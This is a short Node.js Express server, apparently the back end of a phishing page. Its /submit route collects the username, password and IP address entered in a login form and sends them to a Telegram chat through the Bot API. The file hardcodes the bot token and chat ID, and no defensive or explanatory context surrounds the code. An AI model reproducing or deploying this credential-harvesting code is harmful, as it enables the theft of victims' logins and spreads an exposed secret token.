const express = require('express');
const bodyParser = require('body-parser');
const app = express();

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files from the 'public' folder
app.use(express.static('public'));

// Handle form submissions
app.post('/submit', async (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    // Capture the user's IP address and port
    const ipAddress = req.socket.remoteAddress;
    const port = req.socket.remotePort; 

    const chatId = '6091511411';  // Your Telegram chat ID
    const botToken = '7843585795:AAGhHpD0gnZEwnQwdtQTTIWEv_RS1ehH9mI';  // Your Telegram bot token
    const message = `User ID: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nPort: ${port}`;

    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    try {
        // Use dynamic import for node-fetch
        const fetch = (await import('node-fetch')).default;

        // Send message to Telegram
        const response = await fetch(telegramApiUrl);
        const data = await response.json();

        if (!data.ok) {
            throw new Error(data.description);
        }

        // No need to redirect here; it's handled on the client side
        res.status(200).send('updated'); // Respond with success
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
        res.status(500).send('Failed to send message');
    }
});
